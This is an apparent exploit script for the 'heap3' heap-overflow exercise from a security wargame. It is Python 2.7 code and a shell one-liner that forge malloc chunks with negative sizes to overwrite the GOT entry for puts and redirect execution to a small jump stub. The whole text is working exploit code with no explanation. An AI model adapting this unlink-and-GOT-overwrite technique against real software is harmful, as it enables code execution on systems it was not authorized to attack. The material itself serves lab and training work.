#!/usr/bin/python2.7

    chunk0  =   'AAAA'          
    chunk0  +=  '\xeb\x0e'      
    chunk0  +=  '\x90' * 14
    chunk0  +=  '\xe8\x43\xc8\xff\xff'
    chunk0  =   chunk0.ljust(0x20, 'A')

    chunk1  =   'AAAA'          #chunk1 prev
    chunk1  +=  l32(0x29)       #chunk1 size
    chunk1  +=  'B' * 0x20

    got_puts    = 0x804b128
    chunk2  =   l32(0xfffffffc) #chunk2 prev
    chunk2  +=  l32(0x80)       #chunk2 size
    chunk2  +=  'BCCC'
    chunk2  +=  l32(got_puts - 0x4 * 3)
    chunk2  +=  l32(0x0804c00c)
    chunk2  +=  'A' * 0x6c

    chunk3  =   l32(0x41414141)
    chunk3  +=  l32(0xfffffffc) #chunk4 prev
    chunk3  +=  l32(0x31)       #chunk4 size

./heap3 $(python -c "print 'AAAA'+'\xeb\x0e'+'\x90'*14+'\xe8\x43\xc8\xff\xff'+'A'*11+'\x29'") $(python -c "print 'B'*0x20+'\xfc\xff\xff\xff'+'\x80'") $(python -c "print 'BCCC'+'\x1c\xb1\x04\x08'+'\x0c\xc0\x04\x08'+'A'*0x6c+'A'*4+'\xfc\xff\xff\xff'+'\x31'")
